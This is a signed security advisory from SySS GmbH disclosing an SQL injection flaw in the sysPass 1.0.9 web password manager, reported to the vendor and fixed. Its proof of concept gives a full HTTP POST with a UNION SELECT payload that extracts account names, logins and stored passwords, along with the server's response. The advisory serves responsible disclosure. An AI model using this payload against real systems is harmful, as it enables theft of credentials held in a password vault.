@@ -1,0 +1,182 @@
+-----BEGIN PGP SIGNED MESSAGE-----
+Hash: SHA512
+
+Advisory ID: SYSS-2015-031
+Product: sysPass
+Vendor: http://cygnux.org/
+Affected Version(s): 1.0.9 and below
+Tested Version(s): 1.0.9
+Vulnerability Type: SQL Injection (CWE-89)  
+Risk Level: High
+Solution Status: Fixed
+Vendor Notification: 2014-07-27
+Solution Date: 2014-08-04
+Public Disclosure: 2015-07-13
+CVE Reference: Not yet assigned
+Author of Advisory: Daniele Salaris (SySS GmbH)
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+Overview:
+
+sysPass is an web based Password Manager written in PHP and Ajax with a
+built-in multiuser environment.
+
+An SQL injection vulnerability could be identified in one of the requests
+of this web password manager.
+
+The software manufacturer describes the web application as follows
+(see [1]):
+
+"sysPass is a web password manager written in PHP that allows the
+password management in a centralized way and in a multiuser environment.
+The main features are:
+
+* HTML5 and Ajax based interface
+* Password encryption with AES-256 CBC.
+* Users and groups management.
+* Advanced profiles management with 16 access levels.
+* MySQL, OpenLDAP and Active Directory authentication.
+* Activity alerts by email.
+* Accounts change history.
+* Accounts files management.
+* Inline image preview.
+* Multilanguage.
+* Links to external Wiki.
+* Portable backup.
+* Action tracking and event log.
+* One-step install process."
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+Vulnerability Details:
+
+The SQL injection vulnerability was found in an HTTP post request of the
+AJAX component from the sysPass software.
+
+The attribute getAccounts is not correctly sanitized and therefore can be
+abused to inject arbitrary SQL statements.
+
+This SQL injection vulnerability can be exploited by an authenticated
+attacker by sending a specially crafted HTTP POST request (see PoC 
+section).
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+Proof of Concept (PoC):
+
+The following HTTP request can be used to extract information from the
+database:
+
+POST /sysPass-1.0.9/ajax/ajax_search.php HTTP/1.1
+Host: <HOST>
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:39.0) Gecko/20100101 Firefox/39.0
+Accept: text/html, */*; q=0.01
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+X-Requested-With: XMLHttpRequest
+Referer: http://<HOST>/sysPass-1.0.9/index.php
+Content-Length: 249
+Cookie: PHPSESSID=<SESSIONID>
+Connection: keep-alive
+Pragma: no-cache
+Cache-Control: no-cache
+
+search=getAccounts') UNION ALL SELECT NULL,NULL,account_name,account_login,account_pass,account_url,NULL,NULL,NULL,NULL,NULL from accounts -- &start=0&skey=1&sorder=1&sk=081bad3198bdb3cd29133befc57d60287541663b&is_ajax=1&customer=0&category=0&rpp=10
+
+
+The server answers as followed:
+
+HTTP/1.1 200 OK
+Date: Fri, 10 Jul 2015 14:06:04 GMT
+Server: Apache/2.4.12 (Unix) PHP/5.6.10
+X-Powered-By: PHP/5.6.10
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
+Pragma: no-cache
+Set-Cookie: PHPSESSID=<SESSIONID>; path=/; HttpOnly
+Content-Length: 1147
+Keep-Alive: timeout=5, max=100
+Connection: Keep-Alive
+Content-Type: text/html; charset=UTF-8
+
+<div id="data-search-header" class="data-header"><ul class="round header-grey"><li class="header-txt"><a onClick="searchSort(5,0)" 
+title="Sort by Customer" >Customer</a></li><li class="header-txt"><a onClick="searchSort(1,0)" title="Sort by Name">Name</a><img 
+src="imgs/sort_desc.png" class="icon" /></li><li class="header-txt"><a onClick="searchSort(2,0)" title="Sort by Category">Category</a></li><li 
+class="header-txt"><a onClick="searchSort(3,0)" title="Sort by Username">User</a></li><li class="header-txt"><a onClick="searchSort(4,0)" 
+title="Sort by URL / IP">URL / IP</a></li></ul></div><div id="data-search" class="data-rows"><ul><li class="cell-txt txtCliente"></li><li 
+class="cell-txt">TEST_USER</li><li class="cell-txt">TEST_NAME</li><li class="cell-txt"><DATA></li><li 
+class="cell-txt">TEST_URL</li><li class="cell-img"><img src="imgs/btn_group.png" title="Groups:<br><br>*<br>" /></li><li 
+class="cell-actions round"></li></ul></div><div id="pageNav" class="round shadow"><div id="pageNavLeft">1 @ 0.00478 s 
+<span id="txtFilterOn" class="round">Filter ON</span></div><div id="pageNavRight">&nbsp; 1 / 1 &nbsp;</div></div>
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+Solution:
+
+Update sysPass to the latest software version.
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+Disclosure Timeline:
+
+2014-07-27: Vulnerability discovered
+2014-07-27: Vulnerability reported to vendor
+2014-08-04: Vendor releases new fixed version of sysPass 
+2015-07-13: Public release of security advisory
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+References:
+
+[1] Web site of sysPass - sysadmin password manager
+    http://wiki.syspass.org/en/start
+[2] SySS Security Advisory SYSS-2015-031
+    https://www.syss.de/fileadmin/dokumente/Publikationen/Advisories/SYSS-2015-031.txt
+[3] SySS Responsible Disclosure Policy
+    https://www.syss.de/en/news/responsible-disclosure-policy/
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+Credits:
+
+This security vulnerability was found by Daniele Salaris of the SySS GmbH.
+
+E-Mail: disclosure (at) syss.de
+Key fingerprint = E135 4E23 6091 A85C 9E14 577A 28DF B3A7 0A98 A9D4
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+Disclaimer:
+
+The information provided in this security advisory is provided "as is" 
+and without warranty of any kind. Details of this security advisory may 
+be updated in order to provide as accurate information as possible. The
+latest version of this security advisory is available on the SySS Web 
+site.
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+Copyright:
+
+Creative Commons - Attribution (by) - Version 3.0
+URL: http://creativecommons.org/licenses/by/3.0/deed.en
+
+-----BEGIN PGP SIGNATURE-----
+Version: GnuPG v2
+
+iQIcBAEBCgAGBQJVo3V1AAoJECjfs6cKmKnUUgQQALxneKA1L6DQmcqbCf5X1ji1
+UGoSwkpdsvfMAJOeQ5IlpLKd1hYWl3NkeheD74nBZ0YoNjLc9I3uSh1u0Xi25kRu
+xI6RTgWNtroHRYeVN8v2qPFiABXKUxc9zdsEVNLz2PNNU4mbmzaeszrrK3XU7Z/+
+dMjGvAr7b+qWMD3N+l5zSqrh4KMpnmu6XAJSKJM3az6FECsdXFKF7w2DlAr39vrP
+cCkXrN9ekSkEN2wuvh8O3kGQ7T9hsxHCsSGwclb4gUqAVQ4aLcoL782HQulhW3/J
+sMWm3s7PLo0Q10RMhdoJgGKCZfAbn9L2HfjuvXO4YznEjjp/bTwLw3DIGqNSmF3q
+aqFbFZxxgW45JIV9sIfa+A17Q8DZAdsZNLoEOTcznBd9S46qn/ohWhZVOIypof8y
+J3hVMlYYTL52kKEDR2QlVwsNzmfeyE3bmTkUjJD8STz/stQi2shDXQhFe3uJKMna
+gtYh/US+GbWtPvll0NLOlNT9kG+Eytsuj5dgdwMZ82JV3wCyEL6IgbhXpAAAlt9Y
+UQ4Zv6kNLJt2XF3Sws+DXtp5S0bdE5MrKJSa9zUjj38+YmCg+TMMRIgs6U2YGnlk
+JHOrIUZzveTTZ0AXIE/HXFGWnuMOEPjoZBh97y9xdUSej3Wo+knjUrarVfv8PCaG
+GBBy6/A3qHLaOsoxWX0i
+=ZrwB
+-----END PGP SIGNATURE-----
